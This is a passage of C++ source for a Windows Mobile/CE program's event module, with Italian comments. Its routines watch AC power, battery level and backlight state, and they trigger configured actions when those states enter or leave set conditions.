	statusObj->EventAlive(MyData);
	DBG_TRACE(L"Debug - Events.cpp - OnAC event started\n", 5, FALSE);

	LOOP {
		if (dwAcStatus == AC_LINE_ONLINE && bAC == FALSE) {
			bAC = TRUE;
			DBG_TRACE(L"Debug - Events.cpp - OnAC event [IN action triggered]\n", 5, FALSE);
			statusObj->TriggerAction(MyData->uActionId);
		}

		if (dwAcStatus == AC_LINE_OFFLINE && bAC == TRUE) {
			bAC = FALSE;
			DBG_TRACE(L"Debug - Events.cpp - OnAC event [OUT action triggered]\n", 5, FALSE);
			statusObj->TriggerAction(uExitAction);
		}

		if (EventSleep(MyData, 5000)) {
			deviceObj->UnRegisterPowerNotification(AcCallback);
			statusObj->ThreadEventStopped(MyData);
			DBG_TRACE(L"Debug - Events.cpp - OnAC clean stop\n", 5, FALSE);
			return TRUE;
		}
	}

	statusObj->ThreadEventStopped(MyData);
	return 0;
}

DWORD WINAPI OnBatteryLevel(LPVOID lpParam) {
	EVENT_COMMON_DATA(EVENT_BATTERY);

	const SYSTEM_POWER_STATUS_EX2 *pBattery = NULL;
	UINT uExitAction, uMinLevel, uMaxLevel;
	DWORD dwBatteryLife, dwPrevLife;
	BOOL bRange = FALSE;
	Device *deviceObj = Device::self();

	if (statusObj == NULL || lpParam == NULL) {
		return TRUE;	
	}

	if (deviceObj == NULL) {
		return TRUE;
	}

	// DWORD azione in uscita dal range, DWORD livello minimo, DWORD livello massimo
	if (MyData->pParams == NULL || MyData->uParamLength != sizeof(uExitAction) + sizeof(uMinLevel) + sizeof(uMaxLevel)) {
		return TRUE;
	}

	// Azione da eseguire quando si esce dal range
	CopyMemory((BYTE *)&uExitAction, MyData->pParams, sizeof(uExitAction));

	// Livello minimo di batteria sul quale triggerare l'azione
	CopyMemory((BYTE *)&uMinLevel, (BYTE *)(MyData->pParams) + sizeof(uMinLevel), sizeof(uMinLevel));

	// Livello massimo di batteria sul quale triggerare l'azione
	CopyMemory((BYTE *)&uMaxLevel, (BYTE *)(MyData->pParams) + (2 * sizeof(uExitAction)), sizeof(uMaxLevel));

	if (uMinLevel > uMaxLevel) {
		return TRUE;
	}

	deviceObj->RefreshBatteryStatus();
	pBattery = deviceObj->GetBatteryStatus();
	dwPrevLife = pBattery->BatteryLifePercent;

	// Se lo stato e' sconosciuto, assumiamo che sia carica
	if (dwPrevLife == BATTERY_PERCENTAGE_UNKNOWN)
		dwPrevLife = 100;

	if (deviceObj->RegisterPowerNotification(BatteryCallback, (DWORD)&dwBatteryLife) == FALSE) {
		return TRUE;
	}

	statusObj->EventAlive(MyData);
	DBG_TRACE(L"Debug - Events.cpp - OnBatteryLevel event started\n", 5, FALSE);

	LOOP {
		if (dwPrevLife != dwBatteryLife && dwBatteryLife != BATTERY_PERCENTAGE_UNKNOWN) {
			dwPrevLife = dwBatteryLife;

			// Nel range
			if ((dwBatteryLife >= uMinLevel && dwBatteryLife <= uMaxLevel) && bRange == FALSE) {
				bRange = TRUE;
				DBG_TRACE(L"Debug - Events.cpp - OnBatteryLevel event [IN action triggered]\n", 5, FALSE);
				statusObj->TriggerAction(MyData->uActionId);
			} 
			
			// Fuori dal range
			if ((dwBatteryLife < uMinLevel || dwBatteryLife > uMaxLevel) && bRange == TRUE) {
				bRange = FALSE;
				DBG_TRACE(L"Debug - Events.cpp - OnBatteryLevel event [OUT action triggered]\n", 5, FALSE);
				statusObj->TriggerAction(uExitAction);
			}
		}

		if (EventSleep(MyData, 1000)) {
			deviceObj->UnRegisterPowerNotification(BatteryCallback);
			statusObj->ThreadEventStopped(MyData);
			DBG_TRACE(L"Debug - Events.cpp - ObBatteryLevel clean stop\n", 5, FALSE);
			return TRUE;
		}
	}

	statusObj->ThreadEventStopped(MyData);
	return 0;
}

DWORD WINAPI OnStandby(LPVOID lpParam) {
	EVENT_COMMON_DATA(EVENT_STANDBY);
	UINT uExitAction;
	BOOL bPrevState = FALSE, bLightStatus = TRUE;
	Device *deviceObj = Device::self();

	if (statusObj == NULL || lpParam == NULL) {
		return TRUE;	
	}

	if (deviceObj == NULL) {
		return TRUE;
	}

	// DWORD azione in uscita dal BackLight
	if (MyData->pParams == NULL || MyData->uParamLength != sizeof(uExitAction)) {
		return TRUE;
	}

	// Azione da eseguire sull'uscita dallo stato BackLight
	CopyMemory((BYTE *)&uExitAction, MyData->pParams, sizeof(uExitAction));

	CEDEVICE_POWER_STATE powerState = deviceObj->GetDevicePowerState(L"BKL1:");

	if (powerState < D4)
		bLightStatus = TRUE;

	if (deviceObj->RegisterPowerNotification(BackLightCallback, (DWORD)&bLightStatus) == FALSE) {
		return TRUE;
	}

	statusObj->EventAlive(MyData);
	DBG_TRACE(L"Debug - Events.cpp - OnAC event started\n", 5, FALSE);

	LOOP {
		if (bPrevState != bLightStatus) {
			bPrevState = bLightStatus;

			if (bPrevState) { 
				// BackLight On
				DBG_TRACE(L"Debug - Events.cpp - OnBackLight event [IN action triggered]\n", 5, FALSE);
				statusObj->TriggerAction(uExitAction);
			} else { 
				// BackLight Off
				DBG_TRACE(L"Debug - Events.cpp - OnBackLight event [OUT action triggered]\n", 5, FALSE);
				statusObj->TriggerAction(MyData->uActionId);
			}
		}

		if (EventSleep(MyData, 1000)) {
			deviceObj->UnRegisterPowerNotification(BackLightCallback);
			statusObj->ThreadEventStopped(MyData);
			DBG_TRACE(L"Debug - Events.cpp - OnAC clean stop\n", 5, FALSE);
			return TRUE;
		}
	}

	statusObj->ThreadEventStopped(MyData);
	return 0;
}

BOOL EventSleep(pEventStruct pEvent, UINT uMillisec) {
	UINT uLoops;
	UINT uSleepTime = 1000; // Step di 1000ms

	Status *statusObj = Status::self();

	if (uMillisec <= uSleepTime) {
		Sleep(uMillisec);

		if (statusObj->EventQueryStop(pEvent))
			return TRUE;

		return FALSE;
	} else {
		uLoops = uMillisec / uSleepTime;
	}

	while (uLoops) {
		Sleep(uSleepTime);
		uLoops--;

		if(statusObj->EventQueryStop(pEvent))
			return TRUE;
	}

	return FALSE;
}

